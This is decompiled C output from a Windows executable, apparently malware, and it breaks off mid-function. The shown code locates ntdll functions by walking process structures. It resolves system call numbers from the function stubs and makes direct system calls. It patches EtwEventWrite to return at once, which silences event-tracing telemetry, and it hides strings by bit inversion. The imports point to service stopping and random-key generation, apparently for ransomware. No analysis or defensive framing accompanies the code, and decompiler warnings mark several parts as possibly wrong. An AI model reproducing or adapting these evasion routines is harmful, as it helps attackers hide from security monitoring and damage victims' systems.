// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern BOOL (__stdcall *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern SIZE_T (__stdcall *VirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *EnumDependentServicesA)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern _UNKNOWN _initenv; weak
// extern char *acmdln;
// extern int commode;
// extern int fmode;
// extern int (__cdecl *_wcsicmp)(const wchar_t *String1, const wchar_t *String2);
int dword_140011000 = 10; // weak
__int128 xmmword_140011010 = 0xDF9891968FDFBCD0DF9A879AD19B929CLL; // weak
__int128 xmmword_140011020 = 0xDF88D2DFCEDF91D2DFCED1CED1CED1CELL; // weak
__int128 xmmword_140011030 = 0x939ABBDFD9DF938AB1DFC1DFCFCFCFCCLL; // weak
__int64 qword_140011040 = -2459089843765260065LL; // weak
char byte_140011048 = '\xDA'; // weak
char byte_140011049 = '\x8C'; // weak
char byte_14001104A = '\xDD'; // weak
char byte_14001104B = '\xFF'; // weak
void *off_140011050 = &unk_14000E8F0; // weak
_UNKNOWN unk_140011064; // weak
_UNKNOWN unk_140011090; // weak
unsigned __int16 word_1400110A0[16] =
{
  57145u,
  47591u,
  63861u,
  52490u,
  21986u,
  54579u,
  10392u,
  33858u,
  36590u,
  46681u,
  47500u,
  51868u,
  43046u,
  1169u,
  22852u,
  31641u
}; // weak
DWORD nNumberOfBytesToWrite = 538976266u; // idb
__int64 qword_140012060 = 0LL; // weak
__int64 qword_140012068 = 0LL; // weak
int dword_140012070 = 0; // weak
int dword_140012074 = 0; // weak
int dword_140012078 = 0; // weak
void *Src = NULL; // idb
__int64 qword_140012088 = 0LL; // weak
char byte_140012090 = '\0'; // weak
char byte_140012098 = '\0'; // weak
_PVFV qword_1400120A0 = NULL; // weak
signed __int64 qword_1400120A8 = 0LL; // weak
_UNKNOWN unk_1400120B0; // weak
_UNKNOWN unk_1400120B4; // weak
_UNKNOWN unk_1400120B8; // weak
_UNKNOWN unk_1400120C0; // weak
_UNKNOWN unk_1400120C4; // weak
_UNKNOWN unk_1400120C8; // weak
_UNKNOWN unk_1400120CC; // weak
_UNKNOWN unk_1400120D0; // weak
char byte_1400120D8 = '\0'; // weak
__int64 qword_1400120E0 = 0LL; // weak
int dword_1400120E8 = 0; // weak
__int64 (__fastcall *qword_1400120F0)(_QWORD, _QWORD, _QWORD, _QWORD) = NULL; // weak
_UNKNOWN unk_1400120F8; // weak
__int64 qword_140012100 = 0LL; // weak
__int64 qword_140012108 = 0LL; // weak
int dword_140012110 = 0; // weak
LPCRITICAL_SECTION Block = NULL; // idb
__int64 qword_140012150 = 0LL; // weak
_UNKNOWN unk_140012158; // weak
HANDLE Handles = NULL; // idb
__int64 qword_1400121F8 = 0LL; // weak
__int64 qword_140012200; // weak
__int64 qword_140012208; // weak


//----- (0000000140001000) ----------------------------------------------------
__int64 __fastcall sub_140001000(int (__cdecl *a1)(struct _exception *))
{
  __int64 v1; // rcx
  unsigned int v2; // edx
  bool v3; // zf
  bool v4; // al
  int v5; // esi
  __int64 v6; // rsi
  __int64 v7; // rdx

  unk_1400120C0 = 1;
  unk_1400120C4 = 1;
  unk_1400120C8 = 1;
  unk_1400120B4 = 1;
  if ( *(_WORD *)off_14000D010 != 23117 )
    goto LABEL_9;
  v1 = *((int *)off_14000D010 + 15);
  if ( *(_DWORD *)((char *)off_14000D010 + v1) != 17744 )
    goto LABEL_9;
  v2 = *(unsigned __int16 *)((char *)off_14000D010 + v1 + 24);
  if ( v2 >= 0x20B )
  {
    if ( (unsigned __int16)v2 == 523 && *(_DWORD *)((char *)off_14000D010 + v1 + 132) >= 0xFu )
    {
      v3 = *(_DWORD *)((char *)off_14000D010 + v1 + 248) == 0;
      goto LABEL_14;
    }
LABEL_9:
    v4 = 0;
    goto LABEL_10;
  }
  if ( (unsigned __int16)v2 != 267 || *(_DWORD *)((char *)off_14000D010 + v1 + 116) < 0xFu )
    goto LABEL_9;
  v3 = *(_DWORD *)((char *)off_14000D010 + v1 + 232) == 0;
LABEL_14:
  v4 = !v3;
LABEL_10:
  dword_140012070 = v4;
  _set_app_type((_crt_app_type)a1);
  v5 = unk_1400120F8;
  *(_DWORD *)sub_140005F60(a1, unk_1400120F8) = v5;
  v6 = unk_1400120CC;
  *(_DWORD *)sub_140005F50(a1, unk_1400120CC) = v6;
  sub_140001F70();
  if ( unk_140011064 == 1 )
    sub_140002600(a1, v6, v7, sub_140002020);
  return 0LL;
}
// 1400010F3: variable 'v7' is possibly undefined
// 140001F70: using guessed type __int64 sub_140001F70(void);
// 140005F50: using guessed type __int64 __fastcall sub_140005F50(_QWORD, _QWORD);
// 140005F60: using guessed type __int64 __fastcall sub_140005F60(_QWORD, _QWORD);
// 14000D010: using guessed type void *off_14000D010;
// 140012070: using guessed type int dword_140012070;

//----- (0000000140001110) ----------------------------------------------------
__int64 __fastcall sub_140001110(__int64 a1, __int64 a2)
{
  dword_140012074 = unk_1400120B8;
  return _getmainargs(a1, a2, &Src, &dword_140012078, &qword_140012088, unk_1400120B0);
}
// 14000CC30: using guessed type __int64 __fastcall _getmainargs(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140012074: using guessed type int dword_140012074;
// 140012078: using guessed type int dword_140012078;
// 140012088: using guessed type __int64 qword_140012088;

//----- (0000000140001160) ----------------------------------------------------
void __fastcall __noreturn start(
        void (__stdcall *a1)(DWORD dwMilliseconds),
        __int64 a2,
        __int64 a3,
        double a4,
        double a5,
        double a6,
        double a7,
        double a8,
        double a9,
        __m128 a10)
{
  unk_1400120D0 = 1;
  sub_140001180(a1, a4, a5, a6, a7, a8, a9, a10, a2, a3);
}

//----- (0000000140001180) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall __noreturn sub_140001180(
        void (__stdcall *a1)(DWORD dwMilliseconds),
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        __m128 a8,
        __int64 a9,
        __int64 a10)
{
  PVOID StackBase; // rsi
  signed __int64 v11; // rax
  bool v12; // bl
  signed __int64 v13; // rax
  __int64 v14; // rdx
  char *v15; // rax
  BOOL v16; // ecx
  char v17; // dl
  char v18; // cl
  __int64 v19; // rsi
  _QWORD *v20; // r14
  __int64 v21; // r15
  const void *v22; // rsi
  __int64 i; // rbx
  double v24; // xmm4_8
  double v25; // xmm5_8

  if ( unk_1400120D0 )
    GetStartupInfoA((LPSTARTUPINFOA)a1);
  StackBase = NtCurrentTeb()->NtTib.StackBase;
  v11 = _InterlockedCompareExchange64(&qword_1400120A8, (signed __int64)StackBase, 0LL);
  v12 = v11 == 0;
  if ( v11 && StackBase != (PVOID)v11 )
  {
    a1 = Sleep;
    do
    {
      Sleep((DWORD)Sleep);
      v13 = _InterlockedCompareExchange64(&qword_1400120A8, (signed __int64)StackBase, 0LL);
      v12 = v13 == 0;
    }
    while ( v13 && StackBase != (PVOID)v13 );
  }
  if ( (_DWORD)qword_1400120A0 == 1 )
  {
    amsg_exit(a1, &qword_1400120A0, a10, 31LL);
  }
  else if ( (_DWORD)qword_1400120A0 )
  {
    byte_140012090 = 1;
  }
  else
  {
    LODWORD(qword_1400120A0) = 1;
    initterm((_PVFV *)a1, &qword_1400120A0);
  }
  if ( (_DWORD)qword_1400120A0 == 1 )
  {
    initterm((_PVFV *)a1, &qword_1400120A0);
    LODWORD(qword_1400120A0) = 2;
  }
  if ( v12 )
    _InterlockedExchange64(&qword_1400120A8, 0LL);
  if ( TlsCallback_0 )
    TlsCallback_0(a1, &qword_1400120A0, 2LL, 0LL, 0LL);
  sub_1400020D0((__int64)a1, (__int64)&qword_1400120A0);
  qword_140012100 = (__int64)SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)a1);
  sub_140005F20((__int64)a1, (__int64)&qword_1400120A0, v14, (__int64)nullsub_1);
  sub_1400020C0();
  qword_140012060 = (__int64)off_14000D010;
  v15 = *(char **)sub_140005F40();
  if ( v15 )
  {
    v16 = 0;
    while ( 1 )
    {
      v17 = *v15;
      if ( *v15 <= 32 && (!v16 || !v17) )
        break;
      if ( v17 == 34 )
        v16 = !v16;
      ++v15;
    }
    if ( v17 && v17 <= 32 )
    {
      do
        v18 = *++v15;
      while ( v18 && v18 < 33 );
    }
    qword_140012068 = (__int64)v15;
  }
  if ( unk_1400120D0 )
    dword_140011000 = 10;
  v19 = dword_140012078;
  v20 = malloc((size_t)a1);
  if ( v19 <= 0 )
  {
    v21 = 0LL;
  }
  else
  {
    v21 = (unsigned int)v19;
    v22 = Src;
    for ( i = 0LL; i != v21; ++i )
    {
      a1 = (void (__stdcall *)(DWORD))(strlen((const char *)a1) + 1);
      v20[i] = malloc((size_t)a1);
      memcpy(a1, v22, *((_QWORD *)v22 + i));
    }
  }
  v20[v21] = 0LL;
  Src = v20;
  sub_140001EF0((int (__cdecl *)())a1);
  _initenv = qword_140012088;
  sub_140001E00((int (__cdecl *)())a1, 0.0, a3, a4, a5, v24, v25, a8);
}
// 1400013DE: write access to const memory at 14000F1E0 has been detected
// 14000122B: variable 'a10' is possibly undefined
// 1400012C0: variable 'v14' is possibly undefined
// 1400013F5: variable 'v24' is possibly undefined
// 1400013F5: variable 'v25' is possibly undefined
// 140001480: using guessed type __int64 __fastcall nullsub_1();
// 140001F80: using guessed type __int64 __fastcall TlsCallback_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 14000CC50: using guessed type __int64 __fastcall amsg_exit(_QWORD, _QWORD, _QWORD, _QWORD);
// 14000D010: using guessed type void *off_14000D010;
// 140011000: using guessed type int dword_140011000;
// 140012060: using guessed type __int64 qword_140012060;
// 140012068: using guessed type __int64 qword_140012068;
// 140012078: using guessed type int dword_140012078;
// 140012088: using guessed type __int64 qword_140012088;
// 140012090: using guessed type char byte_140012090;
// 1400120A0: using guessed type _PVFV qword_1400120A0;
// 1400120A8: using guessed type signed __int64 qword_1400120A8;
// 140012100: using guessed type __int64 qword_140012100;

//----- (0000000140001440) ----------------------------------------------------
void __fastcall __noreturn sub_140001440(
        void (__stdcall *a1)(DWORD dwMilliseconds),
        __int64 a2,
        __int64 a3,
        double a4,
        double a5,
        double a6,
        double a7,
        double a8,
        double a9,
        __m128 a10)
{
  unk_1400120D0 = 0;
  sub_140001180(a1, a4, a5, a6, a7, a8, a9, a10, a2, a3);
}

//----- (0000000140001460) ----------------------------------------------------
__int64 __fastcall sub_140001460(int (__cdecl *a1)())
{
  return (unsigned int)-(onexit(a1) == 0LL);
}

//----- (0000000140001490) ----------------------------------------------------
__int64 __fastcall sub_140001490(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  if ( *(_DWORD *)a4 == 3100740428LL )
    return *(unsigned __int16 *)(a4 + 4);
  else
    return 0LL;
}

//----- (00000001400014B7) ----------------------------------------------------
__int64 __fastcall sub_1400014B7(__int64 a1, __int64 a2, __int16 a3, __int64 a4)
{
  __int64 v4; // rcx

  v4 = (unsigned __int16)(32 * a3) + a4;
  if ( *(_DWORD *)v4 != 3100740428LL )
    JUMPOUT(0x1400014B3LL);
  return *(unsigned __int16 *)(v4 + 4);
}
// 1400014D7: control flows out of bounds to 1400014B3

//----- (00000001400014E5) ----------------------------------------------------
__int64 __fastcall sub_1400014E5(__int64 a1, __int64 a2, __int16 a3, __int64 a4)
{
  __int64 v4; // rcx

  v4 = a4 - (unsigned __int16)(32 * a3);
  if ( *(_DWORD *)v4 != 3100740428LL )
    JUMPOUT(0x1400014B3LL);
  return *(unsigned __int16 *)(v4 + 4);
}
// 140001505: control flows out of bounds to 1400014B3

//----- (0000000140001513) ----------------------------------------------------
void sub_140001513()
{
  ;
}

//----- (000000014000151A) ----------------------------------------------------
__int64 __fastcall sub_14000151A()
{
  unsigned int v0; // r11d
  __int64 result; // rax

  result = v0;
  __asm { syscall; Low latency system call }
  return result;
}
// 140001520: variable 'v0' is possibly undefined
// 14000151A: using guessed type __int64 __fastcall sub_14000151A();

//----- (0000000140001526) ----------------------------------------------------
__int64 __fastcall sub_140001526(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  LOWORD(a4) = a4 | 0xFFF;
  return a4 - 4095;
}

//----- (0000000140001535) ----------------------------------------------------
struct _LIST_ENTRY *__fastcall sub_140001535(__int64 a1, __int64 a2, __int64 a3, __m64 *a4)
{
  __m64 m64_u64; // rcx
  struct _LIST_ENTRY *Flink; // rbx
  struct _LIST_ENTRY *v6; // r11

  m64_u64 = (__m64)a4->m64_u64;
  if ( *((_BYTE *)&m64_u64 + 1) )
    m64_u64 = _m_punpckhbw(_m_psllqi(m64_u64, 0x20u), 0LL);
  Flink = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink;
  v6 = Flink;
  while ( Flink[5].Flink->Flink != *(struct _LIST_ENTRY **)&m64_u64 )
  {
    Flink = Flink->Flink;
    if ( v6 == Flink->Flink )
      return 0LL;
  }
  return Flink[2].Flink;
}

//----- (000000014000158E) ----------------------------------------------------
__int64 __fastcall sub_14000158E(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return a4 + *(unsigned int *)(a4 + *(unsigned int *)(a4 + 60) + 136);
}

//----- (00000001400015A6) ----------------------------------------------------
__int64 __fastcall sub_1400015A6(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return a4 + *(unsigned int *)(a3 + 28);
}

//----- (00000001400015B3) ----------------------------------------------------
__int64 __fastcall sub_1400015B3(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return a4 + *(unsigned int *)(a3 + 32);
}

//----- (00000001400015C0) ----------------------------------------------------
__int64 __fastcall sub_1400015C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return a4 + *(unsigned int *)(a3 + 36);
}

//----- (00000001400015CD) ----------------------------------------------------
__int64 __fastcall sub_1400015CD(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        const void *a4,
        __int64 a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        __int64 a11,
        __int64 a12)
{
  const void *v12; // rdx
  __int64 i; // rax
  __int64 result; // rax
  unsigned __int64 v17; // [rsp+0h] [rbp-8h]

  v12 = a4;
  v17 = a3;
  for ( i = 0LL; memcmp(v12, (const void *)(a5 + *(unsigned int *)(a11 + 4 * i)), v17); ++i )
    ;
  LOWORD(i) = *(_WORD *)(a12 + 2 * i);
  result = a5 + *(unsigned int *)(a6 + 4 * i);
  if ( a12 - result < 0 )
    return 0LL;
  return result;
}

//----- (0000000140001620) ----------------------------------------------------
__int64 __fastcall sub_140001620(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  __int64 v3; // rdx
  __int64 v4; // rdx
  __int64 v5; // rdx
  __int64 v6; // rdx
  __int64 v7; // rdx
  int v9; // [rsp+0h] [rbp-168h]
  int v10; // [rsp+0h] [rbp-168h]
  int v11; // [rsp+0h] [rbp-168h]
  int v12; // [rsp+0h] [rbp-168h]
  int v13; // [rsp+8h] [rbp-160h]
  int v14; // [rsp+8h] [rbp-160h]
  int v15; // [rsp+8h] [rbp-160h]
  int v16; // [rsp+8h] [rbp-160h]
  int v17; // [rsp+10h] [rbp-158h]
  int v18; // [rsp+10h] [rbp-158h]
  int v19; // [rsp+10h] [rbp-158h]
  int v20; // [rsp+10h] [rbp-158h]
  int v21; // [rsp+18h] [rbp-150h]
  int v22; // [rsp+18h] [rbp-150h]
  int v23; // [rsp+18h] [rbp-150h]
  int v24; // [rsp+18h] [rbp-150h]
  __int64 v25; // [rsp+38h] [rbp-130h] BYREF
  __int64 v26; // [rsp+40h] [rbp-128h] BYREF
  char v27; // [rsp+4Fh] [rbp-119h] BYREF
  __int64 v28[2]; // [rsp+50h] [rbp-118h] BYREF
  int v29[12]; // [rsp+60h] [rbp-108h] BYREF
  __int64 v30; // [rsp+90h] [rbp-D8h] BYREF
  int v31; // [rsp+98h] [rbp-D0h]
  _WORD v32[9]; // [rsp+9Eh] [rbp-CAh] BYREF
  char v33[28]; // [rsp+B0h] [rbp-B8h] BYREF
  int v34; // [rsp+CCh] [rbp-9Ch]
  char v35[26]; // [rsp+D0h] [rbp-98h] BYREF
  _WORD v36[11]; // [rsp+EAh] [rbp-7Eh] BYREF
  int v37; // [rsp+100h] [rbp-68h]
  __int64 v38; // [rsp+108h] [rbp-60h]
  int v39; // [rsp+110h] [rbp-58h]
  __int64 v40; // [rsp+118h] [rbp-50h]
  int v41; // [rsp+120h] [rbp-48h]
  __int64 v42; // [rsp+128h] [rbp-40h]
  char v43[13]; // [rsp+133h] [rbp-35h] BYREF
  __int64 v44; // [rsp+140h] [rbp-28h]
  __int64 v45; // [rsp+148h] [rbp-20h]
  __int64 v46; // [rsp+150h] [rbp-18h]
  __int64 v47; // [rsp+158h] [rbp-10h]
  __int64 v48; // [rsp+160h] [rbp-8h]

  v48 = getpid();
  strcpy(v43, "ntdl");
  *(_QWORD *)&v43[5] = sub_140001535(a1, a2, v2, (__m64 *)v43);
  v44 = sub_14000158E(a1, a2, v3, *(__int64 *)&v43[5]);
  v45 = sub_1400015A6(a1, a2, v44, *(__int64 *)&v43[5]);
  v46 = sub_1400015B3(a1, a2, v44, *(__int64 *)&v43[5]);
  v47 = sub_1400015C0(a1, a2, v44, *(__int64 *)&v43[5]);
  strcpy((char *)v36, "EtwEventWrite");
  v42 = sub_1400015CD(a1, a2, 0xDuLL, v36, *(__int64 *)&v43[5], v45, v9, v13, v17, v21, v46, v47);
  strcpy(v35, "NtProtectVirtualMemory");
  v38 = sub_1400015CD(a1, a2, 0x16uLL, v35, *(__int64 *)&v43[5], v45, v10, v14, v18, v22, v46, v47);
  v39 = sub_140001490(a1, a2, v4, v38);
  if ( !v39 )
  {
    v34 = 0;
    do
    {
      v39 = sub_1400014B7(a1, a2, ++v34, v38);
      if ( v39 )
      {
        v39 -= v34;
        goto LABEL_8;
      }
      v39 = sub_1400014E5(a1, a2, v34, v38);
    }
    while ( !v39 );
    v39 += v34;
  }
LABEL_8:
  strcpy(v33, "NtWriteVirtualMemory");
  *(_QWORD *)&v36[7] = sub_1400015CD(a1, a2, 0x14uLL, v33, *(__int64 *)&v43[5], v45, v11, v15, v19, v23, v46, v47);
  v37 = sub_140001490(a1, a2, v5, *(__int64 *)&v36[7]);
  if ( !v37 )
  {
    *(_DWORD *)&v32[7] = 0;
    do
    {
      ++*(_DWORD *)&v32[7];
      v37 = sub_1400014B7(a1, a2, v32[7], *(__int64 *)&v36[7]);
      if ( v37 )
      {
        v37 -= *(_DWORD *)&v32[7];
        goto LABEL_15;
      }
      v37 = sub_1400014E5(a1, a2, v32[7], *(__int64 *)&v36[7]);
    }
    while ( !v37 );
    v37 += *(_DWORD *)&v32[7];
  }
LABEL_15:
  strcpy((char *)v32, "NtOpenProcess");
  v40 = sub_1400015CD(a1, a2, 0xDuLL, v32, *(__int64 *)&v43[5], v45, v12, v16, v20, v24, v46, v47);
  v41 = sub_140001490(a1, a2, v6, v40);
  if ( !v41 )
  {
    v31 = 0;
    do
    {
      v41 = sub_1400014B7(a1, a2, ++v31, v40);
      if ( v41 )
      {
        v41 -= v31;
        goto LABEL_22;
      }
      v41 = sub_1400014E5(a1, a2, v31, v40);
    }
    while ( !v41 );
    v41 += v31;
  }
LABEL_22:
  v30 = 0LL;
  v29[0] = 48;
  v28[1] = 0LL;
  v28[0] = v48;
  sub_140001513();
  sub_14000151A(a1, a2, 0x1FFFFFLL, &v30, v29, v28);
  v27 = -61;
  v26 = sub_140001526(a1, a2, v7, v42);
  v25 = 4096LL;
  sub_140001513();
  sub_14000151A(a1, a2, &v26, v30, &v25, 4LL);
  sub_140001513();
  sub_14000151A(a1, a2, v42, v30, &v27, 1LL);
  sub_140001513();
  return sub_14000151A(a1, a2, &v26, v30, &v25, 0LL);
}
// 140001800: conditional instruction was optimized away because %var_58.4==0
// 140001958: conditional instruction was optimized away because %var_68.4==0
// 140001AA3: conditional instruction was optimized away because %var_48.4==0
// 140001658: variable 'v2' is possibly undefined
// 14000166D: variable 'v3' is possibly undefined
// 140001733: variable 'v9' is possibly undefined
// 140001733: variable 'v13' is possibly undefined
// 140001733: variable 'v17' is possibly undefined
// 140001733: variable 'v21' is possibly undefined
// 1400017BE: variable 'v10' is possibly undefined
// 1400017BE: variable 'v14' is possibly undefined
// 1400017BE: variable 'v18' is possibly undefined
// 1400017BE: variable 'v22' is possibly undefined
// 1400017D3: variable 'v4' is possibly undefined
// 140001916: variable 'v11' is possibly undefined
// 140001916: variable 'v15' is possibly undefined
// 140001916: variable 'v19' is possibly undefined
// 140001916: variable 'v23' is possibly undefined
// 14000192B: variable 'v5' is possibly undefined
// 140001A61: variable 'v12' is possibly undefined
// 140001A61: variable 'v16' is possibly undefined
// 140001A61: variable 'v20' is possibly undefined
// 140001A61: variable 'v24' is possibly undefined
// 140001A76: variable 'v6' is possibly undefined
// 140001BC9: variable 'v7' is possibly undefined
// 14000151A: using guessed type __int64 __fastcall sub_14000151A(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140001620: using guessed type int var_108[12];
// 140001620: using guessed type __int64 var_128;

//----- (0000000140001C90) ----------------------------------------------------
BOOL __fastcall sub_140001C90(HMODULE a1)
{
  void *v2; // [rsp+0h] [rbp-428h]
  const CHAR *v3; // [rsp+8h] [rbp-420h]
  struct _STARTUPINFOA *v4; // [rsp+10h] [rbp-418h]
  struct _PROCESS_INFORMATION *v5; // [rsp+18h] [rbp-410h]
  CHAR nSize[272]; // [rsp+E0h] [rbp-348h] BYREF
  struct _SECURITY_ATTRIBUTES ProcessAttributes; // [rsp+1F0h] [rbp-238h] BYREF

  GetModuleFileNameA(a1, nSize, (DWORD)nSize);
  sub_140004D70((__int64)&ProcessAttributes, (__int64)nSize, 0x208uLL, (char *)&ProcessAttributes);
  CreateProcessA((LPCSTR)&ProcessAttributes, nSize, &ProcessAttributes, 0LL, 0, 0, v2, v3, v4, v5);
  CloseHandle(&ProcessAttributes);
  return CloseHandle(&ProcessAttributes);
}
// 140001D57: variable 'v2' is possibly undefined
// 140001D57: variable 'v3' is possibly undefined
// 140001D57: variable 'v4' is possibly undefined
// 140001D57: variable 'v5' is possibly undefined
// 140001C90: using guessed type CHAR nSize[272];

//----- (0000000140001D90) ----------------------------------------------------
void sub_140001D90()
{
  xmmword_140011010 = (__int128)_mm_xor_si128(_mm_load_si128((const __m128i *)&xmmword_140011010), (__m128i)-1LL);
  xmmword_140011020 = (__int128)_mm_xor_si128(_mm_load_si128((const __m128i *)&xmmword_140011020), (__m128i)-1LL);
  xmmword_140011030 = (__int128)_mm_xor_si128(_mm_load_si128((const __m128i *)&xmmword_140011030), (__m128i)-1LL);
  qword_140011040 = _mm_xor_si128(_mm_loadl_epi64((const __m128i *)&qword_140011040), (__m128i)-1LL).m128i_u64[0];
  byte_140011048 = ~byte_140011048;
  byte_140011049 = ~byte_140011049;
  byte_14001104A = ~byte_14001104A;
  byte_14001104B = ~byte_14001104B;
}
// 140011010: using guessed type __int128 xmmword_140011010;
// 140011020: using guessed type __int128 xmmword_140011020;
// 140011030: using guessed type __int128 xmmword_140011030;
// 140011040: using guessed type __int64 qword_140011040;
// 140011048: using guessed type char byte_140011048;
// 140011049: using guessed type char byte_140011049;
// 14001104A: using guessed type char byte_14001104A;
// 14001104B: using guessed type char byte_14001104B;

//----- (0000000140001E00) ----------------------------------------------------
void __fastcall __noreturn sub_140001E00(
        int (__cdecl *a1)(),
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        __m128 a8)
{
  double v8; // xmm4_8
  double v9; // xmm5_8

  sub_140001EF0(a1);
  sub_140008781((HCRYPTPROV)a1, (const WCHAR *)&qword_140012060, a2, a3, a4, a5, v8, v9, a8);
}
// 140001E36: variable 'v8' is possibly undefined
// 140001E36: variable 'v9' is possibly undefined
// 140012060: using guessed type __int64 qword_140012060;

//----- (0000000140001E40) ----------------------------------------------------
void (*sub_140001E40())(void)
{
  void (*result)(void); // rax

  for ( result = *(void (**)(void))off_140011050; *(_QWORD *)off_140011050; result = *(void (**)(void))off_140011050 )
  {
    result();
    off_140011050 = (char *)off_140011050 + 8;
  }
  return result;
}
// 140011050: using guessed type void *off_140011050;

//----- (0000000140001E90) ----------------------------------------------------
__int64 __fastcall sub_140001E90(int (__cdecl *a1)())
{
  unsigned int v1; // eax
  __int64 v2; // rcx

  v1 = unk_14000E8C8;
  if ( unk_14000E8C8 == -1 )
  {
    v1 = -1;
    do
    {
      v2 = v1 + 2;
      ++v1;
    }
    while ( *((_QWORD *)&unk_14000E8C8 + v2) );
  }
  if ( v1 )
  {
    a1 = (int (__cdecl *)())v1;
    do
    {
      (*((void (**)(void))&unk_14000E8C8 + (_QWORD)a1))();
      a1 = (int (__cdecl *)())((char *)a1 - 1);
    }
    while ( (_DWORD)a1 );
  }
  return sub_140001460(a1);
}

//----- (0000000140001EF0) ----------------------------------------------------
void __fastcall sub_140001EF0(int (__cdecl *a1)())
{
  unsigned int v1; // eax
  __int64 v2; // rcx

  if ( !byte_140012098 )
  {
    byte_140012098 = 1;
    v1 = unk_14000E8C8;
    if ( unk_14000E8C8 == -1 )
    {
      v1 = -1;
      do
      {
        v2 = v1 + 2;
        ++v1;
      }
      while ( *((_QWORD *)&unk_14000E8C8 + v2) );
    }
    if ( v1 )
    {
      a1 = (int (__cdecl *)())v1;
      do
      {
        (*((void (**)(void))&unk_14000E8C8 + (_QWORD)a1))();
        a1 = (int (__cdecl *)())((char *)a1 - 1);
      }
      while ( (_DWORD)a1 );
    }
    sub_140001460(a1);
  }
}
// 140012098: using guessed type char byte_140012098;

//----- (0000000140001F70) ----------------------------------------------------
__int64 sub_140001F70()
{
  return 0LL;
}
// 140001F70: using guessed type __int64 sub_140001F70();

//----- (0000000140001F80) ----------------------------------------------------
__int64 __fastcall TlsCallback_0(struct _RTL_CRITICAL_SECTION *a1, __int64 a2, int a3)
{
  if ( unk_140011090 != 2 )
    unk_140011090 = 2;
  if ( a3 == 1 )
    sub_140006080(a1, a2, 1);
  return 1LL;
}

//----- (0000000140002000) ----------------------------------------------------
__int64 __fastcall TlsCallback_1(struct _RTL_CRITICAL_SECTION *a1, __int64 a2, int a3)
{
  if ( a3 == 3 || !a3 )
    sub_140006080(a1, a2, a3);
  return 1LL;
}

//----- (0000000140002020) ----------------------------------------------------
__int64 __fastcall sub_140002020(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v5; // eax
  char *v6; // rdi
  FILE *v7; // rax

  v5 = *(_DWORD *)a4;
  if ( *(int *)a4 >= 4 )
  {
    if ( v5 == 4 )
    {
